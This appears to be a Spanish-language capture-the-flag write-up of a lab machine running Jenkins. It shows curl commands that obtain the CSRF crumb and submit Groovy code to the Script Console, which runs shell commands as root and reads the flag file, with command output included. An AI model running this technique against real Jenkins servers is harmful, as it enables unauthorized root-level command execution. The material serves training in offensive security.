// 02

Script Console

2
TOKEN CSRF Y PRIMER COMANDO

/script es la Script Console: con sesión de administrador, acepta código Groovy arbitrario. Antes del POST hace falta el token CSRF de Jenkins (crumb).

GROOVY
$ CRUMB=$(curl -s -b /tmp/pw_c.txt http://10.129.5.88:8080/crumbIssuer/api/json | python3 -c '...')
$ SCRIPT='println(["/bin/bash","-c","id; hostname"].execute().text)'
$ curl -s -b /tmp/pw_c.txt -H "Jenkins-Crumb: $CRUMB" --data-urlencode "script=$SCRIPT" http://10.129.5.88:8080/script
uid=0(root) gid=0(root) groups=0(root)
pennyworth

// RCE POR SCRIPT CONSOLE

Dónde: /script, funcionalidad legítima de administración de Jenkins.
Qué permite: ejecutar código Groovy arbitrario en el proceso de Jenkins — y aquí Jenkins corre directamente como root, así que cualquier comando se ejecuta con privilegios totales.

// OJO CON LA SINTAXIS GROOVY

Escribir las rutas con barra escapada (\/bin\/bash) rompe el script: unexpected char: '\'. Groovy no necesita escapar / dentro de una cadena entre comillas dobles normales.

3
LEER LA FLAG
FLAG
$ SCRIPT='println(["/bin/bash","-c","cat /root/flag.txt"].execute().text)'
$ curl -s -b /tmp/pw_c.txt -H "Jenkins-Crumb: $CRUMB" --data-urlencode "script=$SCRIPT" http://10.129.5.88:8080/script
[flag oculta]

// FLAG

[flag oculta] — leída directamente por el Script Console, sin montar ninguna reverse shell. Tiempo total: ~15 minutos.

// 03

Referencia Comandos

crumbIssuer
GET /crumbIssuer/api/json
Devuelve el token CSRF (crumb) que Jenkins exige en peticiones que modifican estado.
/script (Script Console)
POST /script (campo script, cabecera Jenkins-Crumb)
Ejecuta código Groovy en el proceso de Jenkins; solo accesible con sesión de administrador.
Groovy .execute()
["/bin/bash","-c","comando"].execute().text
Ejecuta un comando del sistema desde Groovy y devuelve su salida como texto, dentro del propio proceso de Jenkins.

// 04

Glosario

Jenkins
Servidor de automatización e integración continua (CI/CD) muy extendido, con un sistema de plugins y scripting (Groovy) muy potente — y peligroso si queda mal protegido.
Script Console
Funcionalidad administrativa de Jenkins para ejecutar código Groovy directamente en el servidor. Es la forma más directa de lograr RCE cuando se tiene una cuenta de administrador.
CSRF crumb
Token anti-CSRF propio de Jenkins. Sin incluirlo en la cabecera Jenkins-Crumb, las peticiones que cambian estado (como ejecutar un script) se rechazan con 403.
Groovy
Lenguaje dinámico sobre la JVM que Jenkins usa para scripting. Permite invocar directamente la API de Java, incluyendo ProcessBuilder/execute() para lanzar comandos del sistema.
